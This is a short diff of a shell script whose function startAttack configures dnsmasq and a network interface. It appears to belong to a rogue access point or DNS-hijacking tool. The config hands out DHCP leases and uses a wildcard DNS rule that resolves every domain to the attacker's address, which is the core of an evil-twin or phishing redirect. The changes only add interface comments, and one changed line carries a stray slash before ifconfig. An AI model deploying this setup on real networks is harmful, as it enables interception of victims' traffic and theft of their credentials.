@@ -100,7 +100,7 @@ function startAttack(){
 	# sleep 5
 
 	echo -e "\n[*] Configurando dnsmasq..."
-	echo -e "interface=enp0s25\n" > dnsmasq.conf
+	echo -e "interface=enp0s25\n" > dnsmasq.conf #Interface enp0s25= Eth0 
 	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
 	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
@@ -110,7 +110,7 @@ function startAttack(){
 	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
 	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
 
-	ifconfig enp0s25 up 192.168.1.1 netmask 255.255.255.0
+/	ifconfig enp0s25 up 192.168.1.1 netmask 255.255.255.0 	#Interface enp0s25= Eth0 
 	 sleep 1
 	 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 	 sleep 1
